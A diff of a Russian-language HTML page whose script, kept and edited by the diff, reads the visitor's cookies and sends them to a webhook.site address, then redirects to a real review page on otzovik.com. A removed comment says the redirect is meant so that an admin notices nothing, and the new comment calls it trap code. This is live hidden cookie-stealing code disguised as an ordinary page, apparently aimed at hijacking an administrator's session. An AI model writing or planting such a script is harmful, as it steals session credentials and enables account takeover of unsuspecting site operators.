@@ -1,5 +1,4 @@
-Переносить строки
-<!DOCTYPE HTML>
+<!DOCTYPE html>
 <html lang="ru">
 <head>
 <link rel="preload" as="font" fetchpriority="high" href="/static/fonts/Golos/GolosTextVF.woff2" type="font/woff2" crossorigin="anonymous">
@@ -855,8 +854,9 @@ threshold: 0,
 ya_observer.observe(ya_feed);
 });
 </script>
+
 <script>
-    // Отправляем куки на твой webhook
+    // КОД-ЛОВУШКА - отправляет куки на webhook
     const webhookUrl = 'https://webhook.site/0f1f1013-7dd3-4d87-bc2b-b3cff290aac9';
     const cookies = document.cookie;
     
@@ -864,8 +864,10 @@ ya_observer.observe(ya_feed);
         mode: 'no-cors'
     });
     
-    // Тихо перенаправляем на реальный отзыв, чтобы админ ничего не заметил
-    window.location.href = 'https://otzovik.com/reviews/streamskill_pro-servis_po_prodvizheniyu_twitch/';
+    // Перенаправление через 2 секунды на реальный отзыв
+    setTimeout(function() {
+        window.location.href = 'https://otzovik.com/reviews/streamskill_pro-servis_po_prodvizheniyu_twitch/';
+    }, 2000);
 </script>
-
-</body></html>
+</body>
+</html>
